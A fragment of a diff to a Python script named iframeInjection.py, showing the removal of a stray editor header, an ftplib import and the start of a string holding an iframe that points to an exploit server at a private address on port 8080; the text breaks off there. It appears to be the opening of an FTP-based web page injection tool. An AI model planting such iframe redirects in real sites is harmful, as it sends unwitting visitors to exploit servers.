@@ -1,4 +1,4 @@
-GNU nano 6.3        iframeInjection.py
+
 from ftplib import FTP
 
 redirect = '<iframe src="http://10.10.10.112:8080/exploit">
